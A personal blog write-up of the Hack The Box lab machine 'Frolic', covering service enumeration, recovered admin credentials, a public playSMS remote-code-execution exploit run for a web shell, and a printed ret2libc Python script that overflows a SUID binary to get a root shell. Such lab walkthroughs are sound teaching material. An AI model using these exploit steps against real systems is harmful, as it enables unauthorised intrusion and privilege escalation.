---
layout: post
category: writeup
---

## Machine Info

- Name: Frolic 
- Description:  Frolic is not overly challenging, however a great deal of enumeration is required due to the amount of services and content running on the machine. The privilege escalation features an easy difficulty return-oriented programming (ROP) exploitation challenge, and is a great learning experience for beginners. 
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  etbios-  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1880/tcp open  http        Node.js (Express middleware)
|_http-favicon: Unknown favicon MD5: 818DD6AFD0D0F9433B21774F89665EEA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Node-RED
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h50m00s, deviation: 3h10m31s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2024-01-19T20:08:40+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-01-19T14:38:40
|_  start_date: N/A
| nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FROLIC<00>           Flags: <unique><active>
|   FROLIC<03>           Flags: <unique><active>
|   FROLIC<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
```

### Samba:
```bash
smbclient -L //10.10.10.111/
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (frolic server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FROLIC
```

I can try to dig deeper but there isn't much there. 

### Node-Red
![assets/images/2024-01-19-frolic-writeup-image-1.png](assets/images/2024-01-19-frolic-writeup-image-1.png)
Needs creds, might just dirsearch

### Nginx


I see a reference to the domain name, I'll add that to my `/etc/hosts`

Let's dirsearch:
```bash
HTB  dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://10.10.10.111:9999/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/10.10.10.111-9999/-_24-01-19_09-42-58.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-19_09-42-58.log

Target: http://10.10.10.111:9999/

[09:42:59] Starting: 
[09:43:01] 200 -  634B  - /admin/
[09:43:01] 301 -  194B  - /admin  ->  http://10.10.10.111:9999/admin/
[09:43:04] 301 -  194B  - /test  ->  http://10.10.10.111:9999/test/        
[09:43:05] 200 -   82KB - /test/                                           
[09:43:06] 403 -  580B  - /dev/                                            
[09:43:06] 301 -  194B  - /dev  ->  http://10.10.10.111:9999/dev/          
[09:43:13] 301 -  194B  - /backup  ->  http://10.10.10.111:9999/backup/    
[09:43:13] 200 -   28B  - /backup/                                         
[09:44:36] 403 -  580B  - /loop/                                            
[09:44:36] 301 -  194B  - /loop  ->  http://10.10.10.111:9999/loop/
```

I visit admin:
![assets/images/2024-01-19-frolic-writeup-image-2.png](assets/images/2024-01-19-frolic-writeup-image-2.png)

I check source and find JS file:

![assets/images/2024-01-19-frolic-writeup-image-3.png](assets/images/2024-01-19-frolic-writeup-image-3.png)

Find this weird page on success:

![assets/images/2024-01-19-frolic-writeup-image-4.png](assets/images/2024-01-19-frolic-writeup-image-4.png)

Finally CTFing has helped, I find the cipher identifier on dcode.fr/en:
![assets/images/2024-01-19-frolic-writeup-image-5.png](assets/images/2024-01-19-frolic-writeup-image-5.png)

![assets/images/2024-01-19-frolic-writeup-image-6.png](assets/images/2024-01-19-frolic-writeup-image-6.png)

![assets/images/2024-01-19-frolic-writeup-image-7.png](assets/images/2024-01-19-frolic-writeup-image-7.png)
![assets/images/2024-01-19-frolic-writeup-image-8.png](assets/images/2024-01-19-frolic-writeup-image-8.png)

We get a zip file spit out so I'll unzip it

```bash
unzip download.zip 
Archive:  download.zip
[download.zip] index.php password: %                                                                                                                                            
➜  HTB zip2john download.zip > hash
ver 2.0 efh 5455 efh 7875 download.zip/index.php PKZIP Encr: TS_chk, cmplen=176, decmplen=617, crc=145BFE23 ts=89C3 cs=89c3 type=8
```

it needs a password, so I'll attempt to crack it with zip2john while I try easier creds:

![assets/images/2024-01-19-frolic-writeup-image-9.png](assets/images/2024-01-19-frolic-writeup-image-9.png)

That was simple
![assets/images/2024-01-19-frolic-writeup-image-10.png](assets/images/2024-01-19-frolic-writeup-image-10.png)
surely this will end soon...
![assets/images/2024-01-19-frolic-writeup-image-11.png](assets/images/2024-01-19-frolic-writeup-image-11.png)

if this ends up being a rabbit hole...

![assets/images/2024-01-19-frolic-writeup-image-12.png](assets/images/2024-01-19-frolic-writeup-image-12.png)

well that gave us something, lets see what we can do with it...

looking deeper into the other directories:
```bash
dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://10.10.10.111:9999/dev/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/10.10.10.111-9999/-dev-_24-01-19_09-55-32.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-19_09-55-32.log

Target: http://10.10.10.111:9999/dev/

[09:55:32] Starting: 
[09:55:37] 200 -    5B  - /dev/test                                        
[09:55:45] 200 -   11B  - /dev/backup/                                     
[09:55:45] 301 -  194B  - /dev/backup  ->  http://10.10.10.111:9999/dev/backup/
```

I find backup:
![assets/images/2024-01-19-frolic-writeup-image-13.png](assets/images/2024-01-19-frolic-writeup-image-13.png)

I login with admin:idkwhatispass

![assets/images/2024-01-19-frolic-writeup-image-14.png](assets/images/2024-01-19-frolic-writeup-image-14.png)

I wasn't able to enumerate much of the version so I sprayed it with a couple of exploits and found an auth RCE to work on version 1.4. This isn't what I'd normally do but I got annoyed and didn't wanna put more effort than I needed to https://github.com/jasperla/CVE-2017-9101:

```bash
CVE-2017-9101 git:(master) python3 playsmshell.py --url http://10.10.10.111:9999/playsms/ --password idkwhatispass --i
[*] Grabbing CSRF token for login
[*] Attempting to login as admin
[+] Logged in!
[*] Grabbing CSRF token for phonebook import
[+] Entering interactive shell; type "quit" or ^D to quit
> whoami
www-data
```

## Privilege Escalation

Alright you know the drill, regular enum, I look for suid binaries to start:

![[assets/images/2024-01-19-frolic-writeup-image-15.png]]

I find this weird rop file in ayush's directory so lets go look there:

```bash
www-data@frolic:/home/ayush/.binary$ ./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

...

This has got to be the most CTF-y box ever... ugh, I guess we're doing a rop chain.. 

vuln func takes 48 bytes:
![assets/images/2024-01-19-frolic-writeup-image-16.png](assets/images/2024-01-19-frolic-writeup-image-16.png)
So we need a bit more than that

52 to be exact. From there I will look for system exit and /bin/bash in the libc binary and call them in that order after sending 52 bytes:

```bash
www-data@frolic:/tmp$ python2 script.py 
# cat script.py
import os
import struct 

base = struct.pack('<I', 0xb7e19000 + 0x0003ada0) # base system
exit = struct.pack('<I', 0xb7e19000 + 0x0002e9d0) # exit 
command = struct.pack('<I', 0xb7e19000 + 0x15ba0b) #command /bin/bash

buffer = "A" * 52 + base + exit + command 

os.system("/home/ayush/.binary/rop " + buffer)
# whoami
root
```


## Beyond Root

This was annoying box, I will not entertain the beyond root.

best,
gerbsec